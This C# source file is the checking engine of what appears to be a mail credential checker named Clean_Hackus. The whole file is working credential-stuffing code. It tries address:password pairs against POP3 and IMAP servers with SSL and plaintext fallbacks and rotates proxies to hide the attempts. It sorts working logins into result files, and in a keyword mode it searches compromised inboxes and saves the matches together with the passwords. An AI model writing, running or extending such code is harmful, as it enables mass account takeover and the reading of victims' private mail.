using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Clean_Hackus_NET8.Models;
using Clean_Hackus_NET8.Models.Enums;
using Clean_Hackus_NET8.Net.Mail;
using Clean_Hackus_NET8.Services.Managers;

namespace Clean_Hackus_NET8.Services;

/// <summary>
/// Core checking engine. For each mailbox, tries protocols in order:
/// POP3 SSL → POP3 Non-SSL → IMAP SSL → IMAP Non-SSL
/// When keywords are enabled, uses IMAP ONLY (keyword search requires IMAP SEARCH).
/// </summary>
public class CheckerEngine
{
    private readonly ServerDatabase _serverDb = ServerDatabase.Instance;
    private readonly StatisticsManager _stats = StatisticsManager.Instance;
    private readonly ProxyManager _proxies = ProxyManager.Instance;
    private readonly ResultsSaver _results = ResultsSaver.Instance;

    /// <summary>
    /// Check a single mailbox through the full fallback chain.
    /// </summary>
    public async Task CheckMailboxAsync(Mailbox mailbox, CancellationToken ct)
    {
        var domain = mailbox.Domain;
        var keywordMode = KeywordSettings.Instance.Enabled && KeywordSettings.Instance.HasKeywords;

        // Gather all server configurations to try
        var serversToTry = BuildFallbackChain(domain, keywordMode);

        if (serversToTry.Count == 0 && !keywordMode)
        {
            // Try auto-discovering POP3 for this domain
            var discovered = await ServerDiscovery.DiscoverPop3Async(domain, ct);
            if (discovered != null)
            {
                _serverDb.SavePop3ToCache(discovered);
                serversToTry = BuildFallbackChain(domain, keywordMode);
            }
        }

        if (serversToTry.Count == 0)
        {
            _stats.IncrementNoHost();
            await _results.SaveNoHostAsync($"{mailbox.Address}:{mailbox.Password}");
            return;
        }

        // Try each server in order
        foreach (var server in serversToTry)
        {
            ct.ThrowIfCancellationRequested();

            var result = await TryServerAsync(mailbox, server, keywordMode, ct);

            switch (result)
            {
                case OperationResult.Ok:
                    _stats.IncrementGood();
                    await _results.SaveGoodAsync($"{mailbox.Address}:{mailbox.Password} | {server.Protocol} {server.Socket} {server.Hostname}:{server.Port}");
                    return;

                case OperationResult.Bad:
                    _stats.IncrementBad();
                    await _results.SaveBadAsync($"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.Error:
                    continue;
            }
        }

        _stats.IncrementError();
        await _results.SaveErrorAsync($"{mailbox.Address}:{mailbox.Password}");
    }

    /// <summary>
    /// Build the ordered fallback chain.
    /// Normal: POP3 SSL → POP3 Non-SSL → IMAP SSL → IMAP Non-SSL
    /// Keyword mode: IMAP SSL → IMAP Non-SSL ONLY
    /// </summary>
    private List<Server> BuildFallbackChain(string domain, bool keywordMode)
    {
        var chain = new List<Server>();

        if (!keywordMode)
        {
            // POP3 first
            var pop3 = _serverDb.GetPop3Servers(domain);
            if (pop3 != null)
            {
                foreach (var s in pop3)
                    if (s.Socket == SocketType.SSL) chain.Add(s);
                foreach (var s in pop3)
                    if (s.Socket == SocketType.Plain) chain.Add(s);
            }

            if (pop3 == null || pop3.Count == 0)
            {
                chain.Add(new Server { Domain = domain, Hostname = $"pop.{domain}", Port = 995, Protocol = ProtocolType.POP3, Socket = SocketType.SSL });
                chain.Add(new Server { Domain = domain, Hostname = $"pop.{domain}", Port = 110, Protocol = ProtocolType.POP3, Socket = SocketType.Plain });
            }
        }

        // IMAP (always included)
        var imap = _serverDb.GetImapServers(domain);
        if (imap != null)
        {
            foreach (var s in imap)
                if (s.Socket == SocketType.SSL) chain.Add(s);
            foreach (var s in imap)
                if (s.Socket == SocketType.Plain) chain.Add(s);
        }

        if (imap == null || imap.Count == 0)
        {
            chain.Add(new Server { Domain = domain, Hostname = $"imap.{domain}", Port = 993, Protocol = ProtocolType.IMAP, Socket = SocketType.SSL });
            chain.Add(new Server { Domain = domain, Hostname = $"imap.{domain}", Port = 143, Protocol = ProtocolType.IMAP, Socket = SocketType.Plain });
        }

        return chain;
    }

    /// <summary>
    /// Try connecting and logging in to a single server.
    /// In keyword mode, also runs IMAP SEARCH after login.
    /// </summary>
    private async Task<OperationResult> TryServerAsync(Mailbox mailbox, Server server, bool keywordMode, CancellationToken ct)
    {
        IMailHandler? handler = null;
        try
        {
            handler = server.Protocol switch
            {
                ProtocolType.POP3 => new Pop3Client(mailbox, server),
                ProtocolType.IMAP => new ImapClient(mailbox, server),
                _ => null
            };

            if (handler == null) return OperationResult.Error;

            var proxy = _proxies.GetNextProxy();

            var connectResult = await handler.ConnectAsync(proxy, ct);
            if (connectResult != OperationResult.Ok) return OperationResult.Error;

            var loginResult = await handler.LoginAsync(ct);

            if (loginResult == OperationResult.Ok && keywordMode && handler is ImapClient imapClient)
            {
                // Run keyword search
                var selectResult = await imapClient.SelectFolderAsync(new Folder { Name = "INBOX" }, ct);
                if (selectResult == OperationResult.Ok)
                {
                    var query = KeywordSettings.Instance.BuildImapSearchQuery();
                    var uids = await imapClient.SearchAsync(query, ct);
                    if (uids.Count > 0)
                    {
                        _stats.IncrementFound();
                        var capture = $"{mailbox.Address}:{mailbox.Password} | KEYWORD_MATCH ({uids.Count} msgs) | {server.Hostname}:{server.Port}";
                        await _results.SaveAsync("Found.txt", capture);
                    }
                }
            }

            await handler.DisconnectAsync(ct);
            return loginResult;
        }
        catch (OperationCanceledException) { throw; }
        catch
        {
            return OperationResult.Error;
        }
        finally
        {
            handler?.Dispose();
        }
    }
}
